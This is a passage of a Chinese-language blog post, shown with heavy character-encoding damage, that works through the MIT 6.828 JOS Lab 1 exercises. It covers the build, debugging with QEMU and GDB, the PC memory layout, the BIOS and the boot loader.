class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>+ as kern/entry.S<br>+ cc kern/entrypgdir.c<br>+ cc kern/init.c<br>+ cc kern/console.c<br>+ cc kern/monitor.c<br>+ cc kern/printf.c<br>+ cc kern/kdebug.c<br>+ cc lib/printfmt.c<br>+ cc lib/readline.c<br>+ cc lib/string.c<br>+ ld obj/kern/kernel<br>ld: warning: section `.bss&#x27; type changed to PROGBITS<br>+ as boot/boot.S<br>+ cc -Os boot/main.c<br>+ ld boot/boot<br>boot block is 412 bytes (max 510)<br>+ mk obj/kern/kernel.img<br></code></pre></td></tr></table></figure><p>å…¶ä¼šç”Ÿæˆä¸€ä¸ªç£ç›˜é•œåƒæ–‡ä»¶</p><p>æ¥ä¸‹æ¥å¯åŠ¨ qemuï¼ŒMIT åœ¨å…¶æä¾›çš„ Makefile æ–‡ä»¶ä¸­å†™å¥½äº†å¯åŠ¨çš„ä»£ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ç•Œé¢å¦‚ä¸‹ï¼Œè¿™ä¸¤ä¸ªç•Œé¢éƒ½å¯ä»¥è¿›è¡Œè¾“å…¥ï¼Œè¿˜æ˜¯ååˆ†æ–¹ä¾¿çš„ï¼š</p><p><img src="https://s2.loli.net/2022/02/20/FCqAQm85o3OUzKH.png" alt="imagepng"></p><p>åœ¨æœ€åˆæ—¶ JOS åªæä¾›äº†ä¸¤ä¸ªå‘½ä»¤ï¼š<code>help</code> å’Œ <code>kerninfo</code>ï¼Œ<strong>è¡¥å®Œå‰©ä¸‹çš„åŠŸèƒ½è®©å…¶æˆä¸ºä¸€ä¸ªå®Œæ•´çš„å†…æ ¸ä¾¿æ˜¯æˆ‘ä»¬åœ¨åé¢å‡ ä¸ª lab ä¸­è¦åšçš„äº‹æƒ…</strong> <img src="https://s2.loli.net/2022/02/20/RmXtkdYnL7HGCK5.png" alt="imagepng"></p><h3 id="The-PCâ€™s-Physical-Address-Space">The PCâ€™s Physical Address Space</h3><p>ä¸€å° PC çš„ç‰©ç†åœ°å€é€šå¸¸éµå¾ªå¦‚ä¸‹å¸ƒå±€ï¼ˆ32ä½ä¸‹ï¼‰ï¼š</p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mercury">+------------------+  &lt;- <span class="hljs-number">0</span>xFFFFFFFF (<span class="hljs-number">4</span>GB)<br>|      <span class="hljs-number">32</span>-bit      |<br>|  memory mapped   |<br>|     devices      |<br>|                  |<br><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><br><br><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><span class="hljs-built_in">/\</span><br>|                  |<br>|      Unused      |<br>|                  |<br>+------------------+  &lt;- depends on amount of RAM<br>|                  |<br>|                  |<br>| Extended Memory  |<br>|                  |<br>|                  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x00100000 (<span class="hljs-number">1</span>MB)<br>|     BIOS ROM     |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000F0000 (<span class="hljs-number">960</span>KB)<br>|  <span class="hljs-number">16</span>-bit devices, |<br>|  expansion ROMs  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000C0000 (<span class="hljs-number">768</span>KB)<br>|   VGA Display    |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x000A0000 (<span class="hljs-number">640</span>KB)<br>|                  |<br>|    Low Memory    |<br>|                  |<br>+------------------+  &lt;- <span class="hljs-number">0</span>x00000000<br></code></pre></td></tr></table></figure><blockquote><p>å…³äºå‰é¢è¿™ 1MB çš„å…·ä½“å†…å­˜å¸ƒå±€ï¼Œå¯ä»¥å‚è§ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">ã€CODE.0x00ã€‘ä»é›¶å¼€å§‹çš„32ä½æ“ä½œç³»ç»Ÿå¼€å‘æ‰‹è®° - arttnba3â€™s blog</a></p></blockquote><h3 id="The-ROM-BIOS">The ROM BIOS</h3><p>åœ¨è¿™éƒ¨åˆ†å®éªŒä¸­æˆ‘ä»¬å°†ä½¿ç”¨ gdb æ¥è°ƒè¯• qemuï¼ŒMIT åŒæ ·åœ¨ Makefile ä¸­ç¼–å†™å¥½äº†ç›¸åº”çš„å‘½ä»¤è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯ç•Œé¢ä¸­æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu-gdb</span><br></code></pre></td></tr></table></figure><p>å…¶ä¼šå¯åŠ¨ä¸€ä¸ªç­‰å¾… gdb è¿æ¥ çš„qemu</p><p><img src="https://s2.loli.net/2022/02/20/rdO63wCxPUovYsN.png" alt="imagepng"></p><p>æ¥ä¸‹æ¥åœ¨ç¬¬äºŒä¸ªç»ˆç«¯ä¸­æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make gdb</span><br></code></pre></td></tr></table></figure><p>å…¶ä¼šå¯åŠ¨ gdb å¹¶è‡ªåŠ¨è¿æ¥ä¸Š qemuï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>CS:IP</code> ä¸º <code>0xf000:0xfff0</code>ï¼Œå³æ­¤æ—¶æ‰§è¡Œçš„ä»£ç åœ°å€ä¸º <code>0xffff0</code> ï¼Œå…¶å®å°±æ˜¯ <strong>BIOS çš„å…¥å£ç‚¹</strong></p><p><img src="https://s2.loli.net/2022/03/15/G8adZYg3pk9lBRr.png" alt="image.png"></p><blockquote><p>ä¸ºäº†åŸæ±åŸå‘³æ¨¡æ‹Ÿ MIT å®éªŒçš„æ„Ÿè§‰ï¼Œç¬”è€…å¹¶æœªè£…ä¸Š pwn æ‰‹å¸¸ç”¨çš„ pwndbg æ’ä»¶ï¼ˆå…¶å®åªæ˜¯æ‡’ + æ€•å‡ºç°å¥‡æ€ªçš„é—®é¢˜ï¼‰</p></blockquote><p>MIT å¯¹è¿™ä¸ªå¯åŠ¨è¿‡ç¨‹æ€»ç»“å‡ºå¦‚ä¸‹ä¸‰ç‚¹ï¼š</p><ul><li><p>IBM PC å¯åŠ¨æ—¶æ‰§è¡Œ 0x000ffff0 å¤„ä»£ç ï¼Œè¿™æ˜¯ä¸º ROM BIOS ä¿ç•™çš„å†…å­˜åŒºåŸŸçš„é¡¶éƒ¨</p></li><li><p>PC å¯åŠ¨æ—¶ <code>CS = 0xf000</code>ï¼Œ<code>IP = 0xfff0</code></p></li><li><p>æ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸ºè·³è½¬æŒ‡ä»¤ï¼Œè·³è½¬è‡³<code>CS = 0xf000, IP = 0xe05b</code> å¤„</p></li></ul><p>ä¸ºä»€ä¹ˆQEMU çš„å¯åŠ¨æµç¨‹æ˜¯è¿™æ ·çš„ï¼Ÿè¿™é¦–å…ˆæ˜¯ Intel è®¾è®¡ 8088 å¤„ç†å™¨çš„æ¨¡å¼ï¼Œä¹‹åè¢« IBM ç”¨åœ¨äº†æœ€åˆçš„ PC ä¸Šï¼Œè¿™æ˜¯å› ä¸ºåœ¨ PC ä¸Šï¼Œ BIOS è¢«â€œç¡¬è¿çº¿â€ï¼ˆhard-wiredï¼‰åˆ°ç‰©ç†åœ°å€çš„ <code>0x0000f0000 - 0x000fffff</code> å¤„ï¼ˆç‰©ç†åœ°å€èµ·å§‹ 64KBï¼‰ï¼Œè¿™ä¸ªè®¾è®¡ä¿è¯äº† BIOS åœ¨å¯åŠ¨æˆ–æ˜¯ç³»ç»Ÿé‡å¯æ—¶æ€»èƒ½æ˜¯ç¬¬ä¸€ä¸ªæ‹¿åˆ°æœºå™¨æ§åˆ¶æƒçš„ï¼Œå› ä¸ºæ­¤æ—¶ RAM ä¸­è¿˜æ²¡æœ‰ä»»ä½•å…¶ä»–çš„è½¯ä»¶å¯ä»¥è®©å¤„ç†å™¨è¿è¡Œï¼ˆç¬”è€…è®¤ä¸ºè¿™æ˜¯ä¸€å¥åºŸè¯ï¼‰ã€‚QEMU è‡ªå·±æœ‰ç€ä¸€ä¸ª BIOSï¼Œåœ¨å¤„ç†å™¨å¤ä½åï¼Œå…¶å¤„åœ¨å®æ¨¡å¼ä¸‹ï¼Œä¸”ä¼šå°† <code>CS:IP</code> è®¾ç½®ä¸º <code>0xf000:0xfff0</code>ï¼Œå› æ­¤ PC ä»æ­¤å¤„çš„ä»£ç å¼€å§‹æ‰§è¡Œâ€”â€”å°† CS å¯„å­˜å™¨å·¦ç§» 4 ä½å†åŠ ä¸Š IP å¯„å­˜å™¨ä¾¿è·å¾—äº†å½“å‰æ‰§è¡Œçš„ä»£ç çš„åœ°å€ <code>0xffff0</code>â€”â€”20ä½çš„åœ°å€çº¿æ’‘èµ·äº† 1MB çš„å†…å­˜ç©ºé—´ã€‚</p><blockquote><p>å½“ç¬”è€…ç¿»è¯‘å®Œ MIT å®éªŒé¡µé¢çš„è¿™ä¸€æ®µè¯ä¹‹åå‘ç°è¿™å®Œå…¨æ²¡æœ‰ä»»ä½•æ„ä¹‰â€”â€”å¯¹äºäºŒè¿›åˆ¶äººæ¥è¯´è¿™æ˜¯å†åŸºç¡€ä¸è¿‡çš„çŸ¥è¯†äº†ï¼Œå› æ­¤åé¢åªä¼šé…Œæƒ…å¼•å…¥ MIT å®éªŒæ–‡æ¡£çš„ç¿»è¯‘ï¼Œæ›´å¤šçš„æ˜¯ç¬”è€…è‡ªå·±è®¤ä¸ºæœ‰å¿…è¦å†™ä¸‹çš„ç¬”è®°ï¼Œä¾‹å¦‚ä¸Šé¢çš„è¿™ä¸€æ®µè¯çš„æœ«å°¾éƒ¨åˆ†ä¾¿æ˜¯ç¬”è€…è‡ªå·±å†™çš„ã€‚</p></blockquote><p>æ¥ä¸‹æ¥çœ‹ Exercise 2ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬å°è¯•è·Ÿè¿›è°ƒè¯•ä¸€ä¸‹ BIOSï¼Œæ„Ÿå—ä¸€ä¸‹ä»–ä¼šåšäº›ä»€ä¹ˆï¼š</p><blockquote><p>Exercise 2. Use GDBâ€™s si (Step Instruction) command to trace into the ROM BIOS for a few more instructions, and try to guess what it might be doing. You might want to look at <a href="http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm">http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm</a>, as well as other materials on the <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">6.828 reference materials page</a>. No need to figure out all the details - just the general idea of what the BIOS is doing first.</p></blockquote><p>BIOS ä¸»è¦å®Œæˆçš„å·¥ä½œä¾¿æ˜¯è®¾ç½®ä¸­æ–­å‘é‡è¡¨ï¼ˆInterrupt Vector Tableï¼Œä½äº <code>0x000 ~ 0x3fff</code>ï¼‰ï¼Œåˆå§‹åŒ–ä¸€äº›è®¾å¤‡ï¼ˆä¾‹å¦‚ VGA displayï¼‰ï¼Œæ­¤æ—¶æ˜¾å­˜è¢«æ˜ å°„åˆ° <code>0xa0000 ~ 0xbffff</code>ï¼Œæ˜¾ç¤ºé€‚é…å™¨çš„ BIOS è¢«åŠ è½½åˆ° <code>0xc0000 ~ 0xc7fff</code>ï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ç›´æ¥å‘æ˜¾å­˜æ˜ å°„åŒºå†™å…¥å†…å®¹ä¾¿å¯ä»¥åœ¨å±å¹•ä¸Šæ˜¾ç¤ºå­—ç¬¦</strong></p><p>ä¹‹å BIOS ä¼šè¯»å‡ºç¡¬ç›˜ä¸Šçš„<strong>ç¬¬ä¸€ä¸ªæ‰‡åŒº</strong>åˆ° <code>0x7c00</code> å¤„ï¼Œ<strong>å¹¶è·³è½¬åˆ°è¯¥å¤„</strong>ï¼Œæˆ‘ä»¬ç§°è¢«è½½å…¥çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºä¸º<strong>ä¸»å¼•å¯¼è®°å½•</strong>ï¼ˆMaster Boot Record, aka MBRï¼‰ï¼Œå…¶ä» BIOS æ‰‹ä¸­æ¥è¿‡å¯åŠ¨ PC çš„æ¥åŠ›æ£’</p><blockquote><p>MIT åŸå®éªŒæ–‡æ¡£ä¸­å†™çš„æ˜¯ BIOS å°†ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆInterrupt Descriptor Tableï¼‰è½½å…¥åˆ°å†…å­˜å½“ä¸­ï¼Œä½†ç¬”è€…è®¤ä¸ºåœ¨<strong>å®æ¨¡å¼ä¸‹åº”å½“ä¸ºä¸­æ–­å‘é‡è¡¨</strong>ï¼Œè¿™æ˜¯å› ä¸ºä¸­æ–­æè¿°ç¬¦æ˜¯ä¸€ä¸ªå±äºä¿æŠ¤æ¨¡å¼ä¸‹çš„æ¦‚å¿µï¼Œè¿™é‡Œåšå‡ºæ”¹æ­£</p></blockquote><h2 id="Part-2-The-Boot-Loader">Part 2: The Boot Loader</h2><p>é€šå¸¸ PC çš„ç¡¬ç›˜ä¸è½¯ç›˜ä¸Šçš„ç©ºé—´è¢«æŒ‰ç…§ <code>æ‰‡åŒº</code> è¿›è¡Œåˆ’åˆ†ï¼Œæœ€å¸¸è§çš„æ‰‡åŒºå¤§å°ä¸º <code>512B</code>ï¼Œå•ä¸ªæ‰‡åŒºä¹Ÿæ˜¯æˆ‘ä»¬è¯»å†™ç£ç›˜æœ€å°çš„æ“ä½œå•ä½ï¼Œè‹¥ç£ç›˜æ˜¯å¯å¼•å¯¼çš„ï¼Œåˆ™ç¬¬ä¸€ä¸ªæ‰‡åŒºç§°ä¸º<strong>å¼•å¯¼æ‰‡åŒº</strong>ï¼Œå› ä¸ºè¯¥æ‰‡åŒºä¸­å­˜æ”¾ç€ <em>å¼•å¯¼åŠ è½½ç¨‹åº</em> çš„ä»£ç ï¼ŒBIOS åœ¨ PC å¯åŠ¨åå®Œæˆå…¶å·¥ä½œåä¼šå°†è¯¥æ‰‡åŒºè¯»åˆ°å†…å­˜ä¸­çš„ <code>0x7c00 ~ 0x7fff</code> å¤„ï¼Œä¹‹åä½¿ç”¨ä¸€ä¸ª <code>jmp</code> è·³è½¬æŒ‡ä»¤è·³è½¬è‡³ <code>CS:IP = 0000:7C00</code>ï¼Œå°†æ§åˆ¶æƒäº¤ç»™è¿™ä¸€éƒ¨åˆ†ä»£ç </p><blockquote><p>MIT æ–‡æ¡£è®¤ä¸ºï¼Œè¿™ä¸ªåœ°å€æ˜¯ç›¸å½“éšæ„çš„ï¼Œ<strong>ä½†ç»ç¬”è€…è€ƒè¯è¿™æ˜¯ä¸€ä¸ªæœ‰æ¥å¤´çš„åœ°å€</strong>ï¼Œå‚è§<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">ã€CODE.0x00ã€‘ä»é›¶å¼€å§‹çš„32ä½æ“ä½œç³»ç»Ÿå¼€å‘æ‰‹è®° - arttnba3â€™s blog</a></p></blockquote><p>ç”±äº CD-ROM çš„å‡ºç°åœ¨ PC å‘å±•å²ä¸­è¾ƒæ™šï¼Œè¿™ç»™äº† PC æ¶æ„å¸ˆè¶³å¤Ÿçš„æ—¶é—´å»é‡æ–°æ€è€ƒå¹¶è®¾è®¡åŠŸèƒ½æ›´åŠ å¼ºå¤§çš„å¼•å¯¼æ–¹å¼ï¼ŒCD-ROM é€šå¸¸ä½¿ç”¨ <code>2048B</code> çš„æ‰‡åŒºå¤§å°ï¼Œä¸” BIOS ä¼šå°†æ›´å¤šçš„æ‰‡åŒºä½œä¸ºå¼•å¯¼æ˜ åƒè½½å…¥å†…å­˜ä¸­ï¼Œè¿™éƒ¨åˆ†å†…å®¹å¯ä»¥å‚è§<a href="https://pdos.csail.mit.edu/6.828/2018/readings/boot-cdrom.pdf">&quot;El Torito&quot; Bootable CD-ROM Format Specification</a></p><p>6.828 çš„ boot loader åŒ…å«ä¸¤ä¸ªæ–‡ä»¶ï¼š<code>boot/boot.S</code> ä¸ <code>boot/main.c</code>ï¼Œå…¶å®Œæˆä»¥ä¸‹ä¸¤ä¸ªå·¥ä½œï¼š</p><ul><li><p>å°†å¤„ç†å™¨<strong>ä»å®æ¨¡å¼åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼</strong>ï¼ˆboot.Sï¼‰</p><ul><li><p>æ‰“å¼€ A20-Gate ä»¥æ”¯æŒå¤§äº 1MB çš„åœ°å€ç©ºé—´</p></li><li><p>åŠ è½½å…¨å±€æ®µæè¿°ç¬¦è¡¨</p></li><li><p>è®¾ç½® cr0 å¯„å­˜å™¨å¯¹åº”æ ‡å¿—ä½ï¼Œè¿›å…¥ä¿æŠ¤æ¨¡å¼</p></li></ul></li><li><p>é€šè¿‡ x86 çš„ç‰¹æ®Š I/O æŒ‡ä»¤ä»ç£ç›˜ä¸Šè¯»å–å†…æ ¸å¹¶å°†ä¹‹è½½å…¥å†…å­˜ï¼Œè·³è½¬åˆ°å†…æ ¸ï¼ˆboot.cï¼‰</p><ul><li><p>é€šè¿‡ <code>in</code> ä¸ <code>out</code> è¿™ä¸¤æ¡æŒ‡ä»¤è¯»å–ç£ç›˜æ•°æ®</p></li><li><p>æ£€æŸ¥å¹¶åˆ†æ ELF headerï¼Œè·³è½¬åˆ°å†…æ ¸</p></li></ul></li></ul><p>åœ¨å¤§äºŒä¸‹å­¦ä¹ æ“ä½œç³»ç»Ÿè¯¾ç¨‹æ—¶ç¬”è€…æœ‰å¹¸å°è¯•äº²æ‰‹å†™è¿‡ä¸€ä¸ªå†…æ ¸ï¼ˆè™½ç„¶è¿œæ²¡æœ‰å®Œæˆï¼‰ï¼Œå…¶ä¸­å°±åŒ…æ‹¬å†™ loaderï¼Œå› æ­¤è¿™ä¸€éƒ¨åˆ†ç¬”è€…è¿˜æ˜¯ç›¸å¯¹è¾ƒä¸ºç†Ÿæ‚‰çš„ï¼Œä¸è¿‡ MIT ä»£ç çš„ç²¾ç‚¼ç¨‹åº¦è¿œéç¬”è€…ä» <em>å¦ä¸€æœ¬ä¹¦ä¸ŠæŠ„æŠ„æ”¹æ”¹è€Œæ¥çš„ä»£ç </em> æ‰€èƒ½æ¯”æ‹Ÿçš„ï¼Œæ¨èå¤§å®¶ä»”ç»†é˜…è¯»ï¼ˆç¬‘ï¼‰</p><p>ä¸‹é¢çœ‹ Exercise 3ï¼Œä¸»è¦æ˜¯å‚ç…§ 6.828 çš„æ‰‹å†Œå­¦ä¹  GDBï¼Œè¿™é‡Œå°±ä¸è´´è¿‡ç¨‹äº†ï¼š</p><blockquote><p>Exercise 3.Â Take a look at the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>, especially the section on GDB commands. Even if youâ€™re familiar with GDB, this includes some esoteric GDB commands that are useful for OS work.</p><p>Set a breakpoint at address 0x7c00, which is where the boot sector will be loaded. Continue execution until that breakpoint. Trace through the code inÂ boot/boot.S, using the source code and the disassembly fileÂ obj/boot/boot.asmÂ to keep track of where you are. Also use theÂ x/iÂ command in GDB to disassemble sequences of instructions in the boot loader, and compare the original boot loader source code with both the disassembly inÂ obj/boot/boot.asmÂ and GDB.</p><p>Trace intoÂ bootmain()Â inÂ boot/main.c, and then intoÂ readsect(). Identify the exact assembly instructions that correspond to each of the statements inÂ readsect(). Trace through the rest ofÂ readsect()Â and back out intoÂ bootmain(), and identify the begin and end of theÂ forÂ loop that reads the remaining sectors of the kernel from the disk. Find out what code will run when the loop is finished, set a breakpoint there, and continue to that breakpoint. Then step through the remainder of the boot loader.</p></blockquote><p>6.828 è¿˜æä¾›ç»™æˆ‘ä»¬ä¸€ä»½åç¼–è¯‘åçš„ loader æ–‡ä»¶ï¼Œä½äº <code>obj/boot/boot.asm</code>ï¼Œä¸ºä¸Šé¢ä¸¤ä¸ªæ–‡ä»¶ç¼–è¯‘ååœ¨å†…å­˜ä¸­çš„æ ·å­ï¼Œå¹¶é™„ä¸Šäº†è´´å¿ƒçš„æ³¨é‡Šï¼Œæ¨èå¤§å®¶é…åˆç€è¿™ä»½æ–‡ä»¶è¿›è¡Œè°ƒè¯•ï¼Œ<strong>æè‡´äº«å—</strong>ï¼ˆç¬‘ï¼‰</p><p><img src="https://s2.loli.net/2022/02/20/pGUmRero8DqvH5j.png" alt="imagepng"></p><p>æ¥ä¸‹æ¥è§£å†³ä¸€äº› 6.828 çš„ä¹ é¢˜ï¼š</p><ul><li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?</p><ul><li><p>åœ¨ <code>boot.main.c</code> ä¸­çš„ bootmain() ä¸­é€šè¿‡ <code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code> è·³è½¬åˆ°å†…æ ¸å…¥å£ç‚¹</p></li><li><p>å½“ MBR è®¾ç½®äº† cr0 å¯„å­˜å™¨çš„ <code>PE</code> æ ‡å¿—ä½åï¼Œå¤„ç†å™¨ä»å®æ¨¡å¼è¿›å…¥åˆ°ä¿æŠ¤æ¨¡å¼ï¼Œå¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸º <code>ljmp $0x8,$0x7c32</code>ï¼Œ<strong>è¿™æ˜¯åœ¨åŠ è½½äº†å…¨å±€æ®µæè¿°ç¬¦è¡¨åä½¿ç”¨ä»£ç æ®µæè¿°ç¬¦å®Œæˆçš„ä¸€ä¸ªè·³è½¬æŒ‡ä»¤</strong></p><p><img src="https://s2.loli.net/2022/02/20/bDBS7YIQpKEAlqJ.png" alt="imagepng"></p></li></ul></li><li><p>What is the <em>last</em> instruction of the boot loader executed, and what is the <em>first</em> instruction of the kernel it just loaded?</p><ul><li><p>boot loader æ‰§è¡Œçš„æœ€åä¸€æ¡æŒ‡ä»¤ä¸º<code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code>ï¼Œå¯¹åº”æ±‡ç¼–ä»£ç  <code>call *0x10018</code>â€”â€”è¿™æ˜¯ kernel çš„å…¥å£ç‚¹ï¼Œè€Œ kernel æ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸º <code>movw $0x1234, 0x472</code></p><p><img src="https://s2.loli.net/2022/02/20/DHyfhqPj7NgbsT6.png" alt="imagepng"></p></li></ul></li><li><p><em>Where</em> is the first instruction of the kernel?</p><ul><li>kernel çš„ç¬¬ä¸€æ¡æŒ‡ä»¤åœ¨å…¶ ELF å…¥å£ç‚¹æ ‡æ³¨çš„ä½ç½®ï¼Œè¿™é‡Œæ˜¯ <code>0x10018</code></li></ul></li><li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information?</p><ul><li>loader é¦–å…ˆä¼šä»ç£ç›˜ä¸Šè¯»å–å‰é¢ä¸€å¼ é¡µçš„å†…å®¹ï¼ˆå¤§å°0x1000ï¼‰ï¼Œåœ¨åˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„ ELF header ä¹‹åè§£æå…¶èŠ‚è¡¨ï¼ˆå…¶ä¸­åŒ…å«æ¯ä¸€èŠ‚ï¼ˆsectionï¼Œä¹Ÿç§°æ®µï¼ˆsegmentï¼‰ï¼‰çš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯¥æ®µåœ¨æ–‡ä»¶å†…çš„åç§»ï¼ˆp_offsetï¼‰ã€åœ¨å†…å­˜ä¸­çš„åŠ è½½åœ°å€ï¼ˆp_vaddrï¼‰ã€åœ¨æ–‡ä»¶ä¸­çš„å¤§å°ï¼ˆp_fileszï¼‰ã€è¯¥æ®µåœ¨å†…å­˜ä¸­çš„å¤§å°ï¼ˆp_memszï¼‰ã€è¯¥æ®µçš„æ ‡å¿—ä½ï¼ˆp_flagsï¼Œä¸»è¦æ ‡è¯† rwx æƒé™ï¼‰ï¼‰ï¼Œæ ¹æ®èŠ‚è¡¨ä¿¡æ¯ä»ç£ç›˜ä¸Šè¯»å–æ•°æ®</li></ul></li></ul><h3 id="Loading-the-Kernel">Loading the Kernel</h3><p>é¦–å…ˆçœ‹ Exercise 4ï¼Œä¸»è¦æ˜¯<strong>å¤ä¹ </strong>ä½ çš„ C è¯­è¨€çŸ¥è¯†ï¼Œå°¤å…¶æ˜¯å…³äºæŒ‡é’ˆçš„é‚£ä¸€éƒ¨åˆ†ï¼ˆç¬‘ï¼‰ï¼Œè¿™ä¸€å—å¯ä»¥å‚è€ƒå¤§åé¼é¼çš„ K&amp;R Cï¼Œä»¥åŠè£…è½½é“¾æ¥ELFæ–‡ä»¶ç­‰åŸºç¡€çŸ¥è¯†ï¼Œç¬”è€…æ¨èé˜…è¯»ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹</p><blockquote><p>Exercise 4.Â Read about programming with pointers in C. The best reference for the C language is <em>The C Programming Language</em> by Brian Kernighan and Dennis Ritchie (known as â€˜K&amp;Râ€™). We recommend that students purchase this book (here is an <a href="http://www.amazon.com/C-Programming-Language-2nd/dp/0131103628/sr=8-1/qid=1157812738/ref=pd_bbs_1/104-1502762-1803102?ie=UTF8&amp;s=books">Amazon Link</a>) or find one of <a href="http://library.mit.edu/F/AI9Y4SJ2L5ELEE2TAQUAAR44XV5RTTQHE47P9MKP5GQDLR9A8X-10422?func=item-global&amp;doc_library=MIT01&amp;doc_number=000355242&amp;year=&amp;volume=&amp;sub_library=">MITâ€™s 7 copies</a>.</p><p>Read 5.1 (Pointers and Addresses) through 5.5 (Character Pointers and Functions) in K&amp;R. Then download the code for <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/pointers.c">pointers.c</a>, run it, and make sure you understand where all of the printed values come from. In particular, make sure you understand where the pointer addresses in printed lines 1 and 6 come from, how all the values in printed lines 2 through 4 get there, and why the values printed in line 5 are seemingly corrupted.</p><p>There are other references on pointers in C (e.g., <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pointers.pdf">A tutorial by Ted Jensen</a> that cites K&amp;R heavily), though not as strongly recommended.</p><p><em>Warning:</em> Unless you are already thoroughly versed in C, do not skip or even skim this reading exercise. If you do not really understand pointers in C, you will suffer untold pain and misery in subsequent labs, and then eventually come to understand them the hard way. Trust us; you donâ€™t want to find out what â€œthe hard wayâ€ is.</p></blockquote><p>æ¥ä¸‹æ¥æ˜¯ Exercise 5ï¼Œä¸»è¦æ˜¯æ”¹ Makefile æ–‡ä»¶ä¸­æŒ‡å®šçš„é“¾æ¥åœ°å€ç„¶åé‡æ–°è°ƒè¯•ä½“éªŒä¸€ä¸‹ï¼Œè¿™é‡Œå°±è·³è¿‡äº†</p><blockquote><p>Exercise 5. Trace through the first few instructions of the boot loader again and identify the first instruction that would â€œbreakâ€ or otherwise do the wrong thing if you were to get the boot loaderâ€™s link address wrong. Then change the link address in boot/Makefrag to something wrong, run make clean, recompile the lab with make, and trace into the boot loader again to see what happens. Donâ€™t forget to change the link address back and make clean again afterward!</p></blockquote><p>æœ€åæ˜¯ Exercise 6ï¼Œä½¿ç”¨ GDB æŒ‡ä»¤åœ¨ BIOS å°†æ§åˆ¶æƒäº¤ç»™ MBR æ—¶æŸ¥çœ‹å†…å­˜ <code>0x00100000</code> å¤„çš„æ•°æ®</p><blockquote><p>Exercise 6.Â We can examine memory using GDBâ€™sÂ xÂ command. The <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html">GDB manual</a> has full details, but for now, it is enough to know that the commandÂ x/<em>N</em>x <em>ADDR</em> prints <em>N</em> words of memory at <em>ADDR</em>. (Note that both 'xâ€™s in the command are lowercase.) <em>Warning</em>: The size of a word is not a universal standard. In GNU assembly, a word is two bytes (the â€˜wâ€™ in xorw, which stands for word, means 2 bytes).</p><p>Reset the machine (exit QEMU/GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really 